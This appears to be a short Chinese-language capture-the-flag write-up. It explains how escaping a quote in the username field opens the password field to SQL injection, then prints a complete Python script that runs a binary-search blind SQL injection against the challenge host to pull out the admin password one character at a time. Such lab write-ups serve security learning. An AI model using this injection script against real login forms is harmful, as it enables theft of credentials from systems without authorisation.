这里需要\来转义'从而将$_POST["password"]释放出来.
语句会变为

`select * from users where username=('$_POST["username"] and password=' )($_POST["password"]');

这样就可以在password处进行数字注入

采用二分法

import requests
import time

url = 'http://6508e5bd-9f0d-441f-9954-107228bdd7fa.node3.buuoj.cn/index.php'
flag = ""
data  ={"username":"admin\\","password":""}
for i in range(1,1000):
    low = 32
    high = 128
    mid = (low+high) // 2
    while(low<high):
        time.sleep(0.2)
        payload = "or/**/if(ascii(substr(password,{},1))>{},1,0)#".format(i,mid)  
        data['password']=payload
        r = requests.post(url,data=data).text
        if "stronger" in r:
            low = mid + 1
        else:
            high = mid
        mid = (low+high) // 2
        print(mid)
    if(mid == 32 or mid ==132):
        break
    flag +=chr(mid)
    print(flag)
